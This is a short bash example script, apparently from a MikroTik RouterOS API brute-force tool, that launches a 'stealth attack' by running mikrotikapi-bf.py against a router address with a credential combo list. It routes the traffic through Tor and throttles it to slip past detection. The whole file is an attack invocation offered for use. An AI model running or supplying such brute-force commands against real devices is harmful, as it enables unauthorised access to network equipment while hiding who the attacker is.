#!/bin/bash

# Example 3: Stealth attack through Tor
# Route traffic through SOCKS5 proxy with retry

echo "=== Example 3: Stealth Attack via Tor ==="
echo "Make sure Tor is running: sudo service tor start"

python ../mikrotikapi-bf.py \
  -t 192.168.88.1 \
  -d combos.txt \
  --proxy socks5://127.0.0.1:9050 \
  --threads 1 \
  --seconds 10 \
  --max-retries 5 \
  --circuit-breaker \
  --progress \
  -v

echo ""
echo "Stealth attack completed"

